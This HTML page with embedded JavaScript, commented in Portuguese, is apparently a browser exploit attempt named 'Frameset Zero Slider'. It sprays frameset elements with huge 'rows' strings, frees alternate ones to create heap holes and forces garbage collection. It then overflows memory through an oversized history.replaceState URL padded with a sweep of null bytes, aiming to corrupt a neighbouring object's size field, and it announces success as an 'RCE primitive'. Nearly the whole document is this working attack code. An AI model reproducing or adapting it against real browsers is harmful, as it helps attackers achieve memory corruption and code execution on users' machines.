<!DOCTYPE html>
<html>
<head>
    <title>Frameset Zero Slider</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Frameset Zero Slider</h1>
    <p>Tentativa final de alinhar o '_size' do Frameset usando padding de zeros.</p>

    <button onclick="startFramesetSlider()">INICIAR VARREDURA FINAL</button>
    <button onclick="stop()" style="color:red; border-color:red">PARAR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Ponto de partida recuado (para garantir que pegamos o início)
        const START_OFFSET = 709480; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração Frameset 1MB
        const TARGET_BYTES = 1024 * 1024;
        const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
        const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);

        var victims = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startFramesetSlider() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando Slider em Frameset...");

            // Varre de 0 a 128 bytes de Zeros
            for (let zeros = 0; zeros <= 128; zeros += 8) {
                if(!isRunning) break;

                log(`--- TESTANDO: ${zeros} ZEROS de Padding ---`);

                // 1. Limpeza
                victims = [];
                await forceGC();

                try {
                    // 2. SPRAY FRAMESETS
                    const SPRAY_COUNT = 60;
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let fset = document.createElement('frameset');
                        fset.rows = ROWS_STRING;
                        victims.push(fset);
                    }

                    // 3. BURACOS
                    for(let i=0; i<SPRAY_COUNT; i+=2) {
                        victims[i].rows = ""; 
                        victims[i] = null;
                    }
                    await forceGC();

                    // 4. EXPLOIT (REPLACESTATE + ZEROS)
                    setTimeout(() => {
                        try {
                            // A: Base Recuada
                            let buffer = "A".repeat(START_OFFSET);
                            
                            // B: O Slider (Zeros para pular padding desconhecido)
                            buffer += "\u0000".repeat(zeros);
                            
                            // C: O Ataque (0x01 no _size)
                            buffer += "\x01".repeat(OVERFLOW_AMT);
                            
                            history.replaceState({}, "fs_slider_" + zeros, "/" + buffer);

                            checkVictims(zeros);

                        } catch (e) {
                            log(`Erro (${zeros}): ${e.message}`);
                        }
                    }, 500);

                    // Pausa
                    await new Promise(r => setTimeout(r, 600));

                } catch(e) {
                    log("Erro memória: " + e.message);
                }
            }
            log("Fim do teste.");
        }

        function checkVictims(zCount) {
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                try {
                    // Tenta ler. Se _size for corrompido, isso deve falhar ou retornar lixo.
                    let s = fset.rows;

                    if (s.length !== ROWS_STRING.length) {
                        log(`!!! JACKPOT !!! Frameset ${i} Length: ${s.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        isRunning = false;
                        return;
                    }
                } catch(e) {
                    // Erro de memória ao ler é SUCESSO aqui
                    log(`!!! JACKPOT (OOM) !!! Frameset ${i} explodiu ao ler com ${zCount} zeros!`, 'win');
                    alert("RCE PRIMITIVE UNLOCKED (OOM)!");
                    isRunning = false;
                    return;
                }
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
